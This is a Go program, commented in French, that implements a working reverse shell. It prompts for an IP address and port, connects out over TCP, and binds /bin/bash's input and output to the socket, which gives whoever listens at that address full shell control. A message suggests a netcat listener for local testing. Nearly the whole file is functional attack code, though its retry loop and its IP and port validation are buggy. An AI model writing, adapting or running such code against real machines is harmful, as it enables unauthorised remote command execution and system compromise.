package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
	"strconv"
    	"strings"
)

func verif_user() {

    var host string
    var port string
    var addr string

    for {
        fmt.Println("entrez votre ip : ")
        fmt.Scan(&host)
        a := strings.Split(host, ".")

        count := 0
        for x := 0; x < len(a); x++ {

            if len(a) != 4 {
                count++
                break
            }

            tmp := 0
            tmp, err := strconv.Atoi(a[x])
            if err != nil {
                panic(err)
                fmt.Println("la valeur entrée n'est pas la bonne")
                break
            }
            if (x == 0 && tmp <= 0 || tmp > 256) || (tmp < 0 || tmp > 256) {
                count++
            }
        }
        if count == 0 {
            break
        }
    }

    for {

        fmt.Println("entrez votre port : ")
        fmt.Scan(&port)

        tmp2, err := strconv.Atoi(port)

        if err != nil {
            fmt.Println("il y a une erreur")
        }

        if tmp2 > 0 && tmp2 < 65337 {
            break
        }
    }
    addr = host + ":" + port

    reverse_shell (addr)
}


/*
La fonction shell est ici pour faire du reverse shell, le parametre de la fonction est au format IP:PORT
*/
func reverse_shell(host string) {


	stderr := os.Stderr
	stdout := os.Stdout


	conn, err := net.Dial("tcp", host) // appell TCP sur l'ip:port
	if err != nil {                    // verification des erreurs
		if nil != conn {
			conn.Close() // ferme la connexion si err == nil et que la connexion est initialisee, permet de fermer proprement
		}
		for i:=1 ; i <= 5; i++ { // la boucle ici pernet de relancer une connexion si cela echoue 5 tentatives avant de fermer la connexion
			fmt.Fprintf(stderr, "ERREUR - Connexion a l'hote impossible\nPour essayer en local : nc -nlvp 7777\n")
			time.Sleep(5 * time.Second)
			reverse_shell(host)
		}
		fmt.Fprintf(stderr, "ECHEC - Connexion a l'hote impossible apres 5 essais\n")
		os.Exit(1) // EXIT == 1 - Exit avec erreur
	}
	fmt.Fprintf(stdout, "Connexion Reussie\n")

	sh := exec.Command("/bin/bash")                   // Execution d'un shell Bash
	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn // multiples affectations des Std{in,out,err} aux pointeur conn pour tout rediriger dans le socket
	sh.Run()                                          // execution du shell avec les redirections ci-dessus

	conn.Close() // fermeture de la connexion lorsque le shell se ferme

	fmt.Fprintf(stdout, "Connexion Fermee\n")
	os.Exit(0) // EXIT == 0 - Exit sans erreur
	
}

func main() {

	verif_user()

}
